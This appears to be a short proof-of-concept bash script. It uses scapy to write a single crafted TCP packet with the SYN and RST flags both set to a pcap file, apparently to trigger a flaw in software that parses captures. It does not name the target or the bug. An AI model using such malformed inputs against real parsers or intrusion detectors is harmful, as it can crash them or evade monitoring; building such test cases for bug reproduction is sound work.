#!/usr/bin/env bash
set -euo pipefail
OUT="${1:?usage: poc.sh <out.pcap>}"
python3 - "$OUT" <<'PY'
import sys
from scapy.all import wrpcap, Ether, IP, TCP
p=Ether()/IP(src="10.0.0.66",dst="10.0.0.80")/TCP(sport=44447,dport=80,flags="SR",seq=1)
p.time=1_700_000_000.0
wrpcap(sys.argv[1],[p])
PY
